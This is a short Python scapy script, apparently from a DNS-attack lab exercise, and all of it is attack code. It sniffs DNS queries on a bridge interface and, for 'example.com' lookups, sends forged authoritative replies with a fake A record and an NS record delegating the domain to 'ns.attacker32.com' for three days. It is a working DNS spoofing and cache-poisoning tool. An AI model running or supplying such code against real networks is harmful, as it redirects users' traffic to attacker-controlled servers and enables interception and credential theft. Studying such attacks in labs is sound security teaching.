#!/usr/bin/env python3
from scapy.all import *
import sys

NS_NAME = "example.com"

def spoof_dns(pkt):
    if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
        print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)  # Create an IP object
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)  # Create a UDP object
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', rdata='1.2.3.5', ttl=259200)  # Create an answer record
        NSsec = DNSRR(rrname=NS_NAME, type='NS', rdata='ns.attacker32.com', ttl=259200)  # Create an answer record
        DNSpkt = DNS(
            id=pkt[DNS].id,
            aa=1,
            rd=0,
            qdcount=1,
            ancount=1,
            nscount=1,
            qd=pkt[DNS].qd,
            an=Anssec,
            ns=NSsec
         ) # Create a DNS object
        spoofpkt = IPpkt / UDPpkt / DNSpkt  # Assemble the spoofed DNS packet
        send(spoofpkt)

myFilter = "udp port 53"
pkt = sniff(iface='br-3e931af5a939', filter=myFilter, prn=spoof_dns)
